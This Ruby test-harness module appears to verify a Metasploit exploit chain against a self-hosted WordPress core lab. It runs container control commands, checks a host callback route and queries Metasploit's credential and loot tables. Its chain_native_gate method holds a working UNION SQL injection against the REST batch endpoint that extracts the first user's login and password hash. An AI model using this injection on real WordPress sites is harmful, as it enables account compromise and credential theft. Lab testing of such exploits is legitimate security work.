# frozen_string_literal: true

require 'base64'
require 'digest'
require 'ipaddr'
require 'json'
require 'net/http'
require 'open3'
require 'socket'
require 'timeout'
require 'uri'
require 'rex/text'
require_relative '../wp2shell/native'

# Real source, data, resource and reverse-route controls for the owned core lab.
module WordpressBatchChainTarget
  include WordpressCoreNativeControls

  class CallbackFailure < StandardError; end

  def chain_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-wordpress-chain.json'), JSON.pretty_generate(@chain)) if @chain
  end

  def chain_command(label, role, *arguments, required: true)
    argv = target_runtime.fetch('compose') + ['exec', '-T', '--user', role == 'app' ? 'www-data' : 'root', role, 'timeout', '30', *arguments]
    output, error, status = Open3.capture3(*argv)
    @chain.fetch(:commands) << { label: label, argv: argv, output_base64: Base64.strict_encode64(output.b), stderr: error, exit: status.exitstatus }
    chain_save
    raise "Native chain control failed: #{label}: #{error}" if required && !status.success?

    [output, status.exitstatus]
  end

  def chain_identity(label)
    output, = chain_command(label, 'app', 'php', '/opt/module-target/control.php')
    identity = JSON.parse(output)
    expect(identity.values_at('core', 'php', 'uid', 'database', 'database_role')).to eq([@release, '8.3.28', 33, 'wp_root', 'module_target@%'])
    expect(identity.fetch('server')).to start_with('11.2.2-MariaDB')
    expect(identity.fetch('database_grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
    expect(identity.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
    expect(identity.fetch('installed_sha256')).to eq(@catalog.fetch('installed_sha256'))
    expect(identity.fetch('archive_sha256')).to eq(@catalog.fetch('sha256'))
    expect(identity.values_at('active_plugins', 'object_cache_dropin')).to eq([[], false])
    expect(identity.fetch('external_object_cache')).to be_falsey
    expect(identity.fetch('bash_executable')).to be(true)
    expect(identity.fetch('prefix')).to eq(@prefix)
    expect(identity.fetch('table_prefix')).to eq(ENV.fetch('WP_CHAIN_TABLE_PREFIX', 'wp_'))
    expect(identity.fetch('options').fetch('permalink_structure').empty?).to eq(ENV.fetch('WP_CHAIN_PLAIN', '0') == '1')
    expect(identity.fetch('file_modifications_disabled')).to eq(@mode == 'upload_disabled')
    identity
  end

  def chain_http(label, path, payload = nil)
    request = payload ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    request['Host'] = 'module-target.test'
    request['Content-Type'] = 'application/json'
    request.body = payload.to_json if payload
    endpoint = target_endpoint('app')
    connection = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    connection.open_timeout = 5
    connection.read_timeout = 20
    connection.max_retries = 0
    response = connection.request(request)
    @chain.fetch(:requests) << { label: label, path: path, payload: payload, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    chain_save
    response
  end

  def chain_native_gate(phase)
    login = chain_http(phase + '-login', @prefix + '/wp-login.php')
    expect(login.code).to eq('200')
    expect(login.body).to include('name="log"', 'name="pwd"')
    home = chain_http(phase + '-homepage', @prefix + '/')
    expect(home.code).to eq('200')
    expect(home.body).to match(/wp-content|wp-includes|api\.w\.org/)
    data = chain_identity(phase + '-identity')
    %w[post page].each do |type|
      response = chain_http(phase + '-' + type, @prefix + '/?rest_route=/wp/v2/' + (type == 'post' ? 'posts' : 'pages'))
      expect(response.code).to eq('200')
      expected = data.fetch('posts').count { |row| row.fetch('post_type') == type && row.fetch('post_status') == 'publish' }
      expect(JSON.parse(response.body).length).to eq(expected)
    end
    first = data.fetch('users').first
    marker = 'NATIVE_CHAIN_' + phase.upcase + '_'
    table = data.fetch('table_prefix')
    expect(table).to match(/\A[a-z_]+\z/)
    expression = 'CONCAT(0x' + marker.unpack1('H*') + ',HEX((SELECT CONCAT(user_login,0x3b,user_pass) FROM ' + table + 'users ORDER BY ID LIMIT 1)))'
    injection = '0) AND 1=0 UNION ALL ' + core_scalar_row(data.fetch('post_columns'), expression) + "\n-- " * 6
    response = chain_http(phase + '-complete-native-union', @prefix + '/?rest_route=/batch/v1', core_native_payload(injection, union: true))
    expect(%w[200 207]).to include(response.code)
    rows = core_native_posts(JSON.parse(response.body))
    if @affected
      expected = marker + (first.fetch('user_login') + ';' + first.fetch('user_pass')).unpack1('H*').upcase
      expect(rows&.select { |row| row['id'] == 99999001 && row.dig('title', 'rendered') == expected }&.length).to eq(1)
    else
      expect(Array(rows).any? { |row| row['id'] == 99999001 }).to be(false)
    end
    chain_resources(phase, %w[app db reporting_db])
    @chain.fetch(:controls) << { phase: phase, independent_complete_native_union: @affected, status: 'passed' }
    chain_save
    data
  end

  def chain_resources(phase, roles)
    roles.each do |role|
      %w[memory.events pids.events].each do |key|
        text, = chain_command(phase + '-' + role + '-' + key, role, 'cat', '/sys/fs/cgroup/' + key)
        values = text.lines.to_h do |line|
          name, value = line.split
          [name, Integer(value)]
        end
        expect(values.values_at('oom', 'oom_kill')).to eq([0, 0]) if key == 'memory.events'
        expect(values.fetch('max')).to eq(0) if key == 'pids.events'
      end
    end
  end

  def chain_callback_probe
    %w[127.0.0.1 0.0.0.0].each do |bind|
      server = TCPServer.new(bind, 0)
      port = server.local_address.ip_port
      token = 'native-chain-' + Rex::Text.rand_text_alphanumeric(24)
      receiver = Thread.new do
        raise Timeout::Error, 'No native callback connection' unless IO.select([server], nil, nil, 10)

        socket = server.accept
        begin
          raise Timeout::Error, 'No native callback bytes' unless IO.select([socket], nil, nil, 5)

          received = Timeout.timeout(5) { socket.read(token.bytesize) }
          socket.write('ACK:' + token)
          received
        ensure
          socket.close
        end
      end
      receiver.report_on_exception = false
      begin
        code = <<~PHP
          $host=gethostbyname('host.docker.internal');
          $socket=@fsockopen($host,(int)$argv[1],$number,$error,4);
          if(!$socket){fwrite(STDERR,"Callback failed: ".$error);exit(2);}
          stream_set_timeout($socket,5);fwrite($socket,$argv[2]);
          $reply=stream_get_contents($socket);fclose($socket);
          echo json_encode(['host'=>$host,'reply'=>$reply,'uid'=>posix_geteuid()],JSON_THROW_ON_ERROR),PHP_EOL;
        PHP
        output, status = chain_command('callback-' + bind, 'app', 'php', '-r', code, port.to_s, token, required: false)
        raise CallbackFailure, 'Native callback PHP failed' unless status.zero?

        result = JSON.parse(output)
        raise CallbackFailure, 'Native callback returned an invalid address' unless IPAddr.new(result.fetch('host')).ipv4?
        raise CallbackFailure, 'Native callback acknowledgement differs' unless result.fetch('reply') == 'ACK:' + token && result.fetch('uid') == 33
        raise CallbackFailure, 'Native callback token differs' unless Timeout.timeout(12) { receiver.value } == token

        @chain.fetch(:callbacks) << { bind: bind, port: port, host: result.fetch('host'), exact_token: true, uid: 33, status: 'passed' }
        chain_save
        return { host: result.fetch('host'), bind: bind }
      rescue CallbackFailure, Timeout::Error, IPAddr::InvalidAddressError, JSON::ParserError => e
        @chain.fetch(:callbacks) << { bind: bind, port: port, status: 'failed', error: e.message }
        chain_save
      ensure
        server.close
        receiver.kill if receiver.alive?
        receiver.join
      end
    end
    raise CallbackFailure, 'No app-to-host callback route passed the native handshake'
  end

  def chain_assert_restored(current)
    %w[core php uid installed_sha256 archive_sha256 config_sha256 database database_role database_grants server table_prefix prefix active_plugins options external_object_cache object_cache_dropin users usermeta post_columns file_modifications_disabled bash_executable plugin_entries].each do |key|
      expect(current.fetch(key)).to eq(@baseline.fetch(key)), "Native state differs: #{key}"
    end
    original = @baseline.fetch('posts').to_h { |row| [row.fetch('ID'), row] }
    actual = current.fetch('posts').to_h { |row| [row.fetch('ID'), row] }
    expect(actual.slice(*original.keys)).to eq(original)
    @chain.fetch(:state_deltas) << { new_posts: actual.reject { |identifier, _row| original.key?(identifier) }.values, postmeta_changed: current.fetch('postmeta') != @baseline.fetch('postmeta') }
    chain_save
  end

  def chain_sql(query)
    output, = chain_command('reporting-sql', 'reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
    output
  end

  def chain_reports
    raise 'Invalid chain reporting workspace' unless @workspace.match?(/\Awordpress_chain_\d+(?:_[a-z]+)?\z/)

    credentials = JSON.parse(chain_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT c.id,p.username,secret.data AS private_data,secret.type AS private_type,c.origin_type,
          o.module_full_name,s.id AS service_id,s.port,s.proto,s.name AS service,host(h.address::inet) AS address,
          l.id AS login_id,l.status,l.access_level,l.last_attempted_at
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id LEFT JOIN metasploit_credential_privates secret ON secret.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services s ON s.id=o.service_id LEFT JOIN hosts h ON h.id=s.host_id
        LEFT JOIN metasploit_credential_logins l ON l.core_id=c.id AND l.service_id=s.id WHERE w.name='#{@workspace}'
      ) row
    SQL
    vulns = JSON.parse(chain_sql(<<~SQL))
      SELECT coalesce(json_agg(row),'[]'::json) FROM (
        SELECT v.id,v.name,v.info,v.service_id,s.name AS service,s.port,host(h.address::inet) AS address,
          ARRAY(SELECT ref.name FROM refs ref JOIN vulns_refs vr ON vr.ref_id=ref.id WHERE vr.vuln_id=v.id ORDER BY ref.name) refs
        FROM vulns v JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id
        LEFT JOIN services s ON s.id=v.service_id WHERE w.name='#{@workspace}' ORDER BY v.id
      ) row
    SQL
    loot = JSON.parse(chain_sql(<<~SQL))
      SELECT coalesce(json_agg(row),'[]'::json) FROM (
        SELECT l.id,l.path,l.ltype,l.content_type,l.service_id,s.name AS service,s.port,host(h.address::inet) AS address
        FROM loots l JOIN workspaces w ON w.id=l.workspace_id LEFT JOIN services s ON s.id=l.service_id
        LEFT JOIN hosts h ON h.id=l.host_id WHERE w.name='#{@workspace}' ORDER BY l.id
      ) row
    SQL
    result = { 'credentials' => credentials, 'vulns' => vulns, 'loot' => loot }
    @chain.fetch(:reports) << { workspace: @workspace, **result }
    chain_save
    result
  end

  # Preserve failed-case state and generated source before disposable teardown.
  def chain_failure_snapshot(label)
    output, status = chain_command('failed-state-' + label, 'app', 'php', '/opt/module-target/control.php', required: false)
    record = { label: label, control_exit: status }
    @chain[:target_contaminated] = true unless status.zero?
    if status.zero?
      identity = JSON.parse(output)
      record[:identity] = identity
      added = identity.fetch('plugin_entries').reject { |path, _digest| @baseline.fetch('plugin_entries').key?(path) }
      record[:added_plugin_entries] = added
      users_changed = identity.fetch('users') != @baseline.fetch('users')
      @chain[:target_contaminated] = users_changed || !added.empty?
      record[:target_contaminated] = @chain[:target_contaminated]
      record[:generated_source] = {}
      added.each do |path, digest|
        next if digest == 'directory' || !path.end_with?('.php') || path.split('/').include?('..')

        code = "require 'wp-load.php';$root=WP_PLUGIN_DIR.'/';$path=realpath($root.$argv[1]);if(!$path||!str_starts_with($path,$root)){exit(2);}echo base64_encode(file_get_contents($path));"
        data, exitcode = chain_command('failed-plugin-source', 'app', 'php', '-r', code, path, required: false)
        record[:generated_source][path] = { exit: exitcode, data_base64: data.strip, expected_sha256: digest }
      end
    end
    record[:reports] = chain_reports if @workspace && target_runtime.fetch('endpoints').key?('reporting_db')
    (@chain[:failed_states] ||= []) << record
    chain_save
  rescue StandardError => e
    @chain[:target_contaminated] = true
    (@chain[:snapshot_errors] ||= []) << { label: label, error: e.message }
    chain_save
  end
end
